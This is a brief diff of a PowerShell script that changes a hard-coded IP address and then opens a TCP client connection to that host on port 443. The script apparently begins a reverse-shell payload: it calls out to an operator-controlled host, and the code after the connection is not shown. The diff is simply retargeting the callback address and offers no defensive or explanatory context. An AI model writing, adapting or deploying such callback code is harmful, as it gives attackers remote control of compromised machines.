@@ -14,7 +14,7 @@ $welcome = '
  ';
 if(1 -eq 1){
 	$mikasa = 0
-	$eren='192.168.52.153';
+	$eren='10.0.0.6';
 	$yaeger=443;
 	$SNK = New-Object System.Net.Sockets.TCPClient($eren,$yaeger);
 }
